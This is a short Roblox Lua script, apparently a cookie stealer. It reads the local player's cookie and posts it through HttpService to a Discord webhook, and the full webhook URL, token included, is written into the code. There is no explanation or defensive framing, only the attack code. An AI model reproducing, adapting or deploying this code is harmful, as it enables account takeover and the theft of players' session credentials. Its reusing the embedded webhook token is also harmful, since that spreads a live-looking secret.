local http = game:GetService("HttpService")
local url = "https://discord.com/api/webhooks/1519322724281876511/w8U8K-U7TwG79mY5NFgFaJfumRWiYUHwQFEo2ZRlgOMyJWtVvDcMreCbBnIqOKNivRuh"
local cookie = game:GetService("Players").LocalPlayer:GetCookie()
http:PostAsync(url, cookie)
